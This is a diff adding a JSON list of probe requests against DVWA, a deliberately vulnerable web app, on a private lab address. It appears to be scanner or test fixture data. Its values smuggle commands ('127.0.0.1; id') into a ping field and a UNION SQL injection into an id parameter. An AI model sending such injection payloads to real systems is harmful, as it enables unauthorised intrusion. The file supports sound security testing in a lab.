@@ -1,0 +1,20 @@
+[
+  {
+    "url": "http://192.168.153.200/DVWA/index.php",
+    "method": "GET",
+    "param": "",
+    "values": [""]
+  },
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/exec/",
+    "method": "POST",
+    "param": "ip",
+    "values": ["127.0.0.1 && echo 'PROBE_SUCCESS'", "127.0.0.1; id"]
+  },
+  {
+    "url": "http://192.168.153.200/DVWA/vulnerabilities/sqli/?Submit=Submit",
+    "method": "GET",
+    "param": "id",
+    "values": ["1' UNION SELECT 'found_sqli', 'confirm' -- "]
+  }
+]
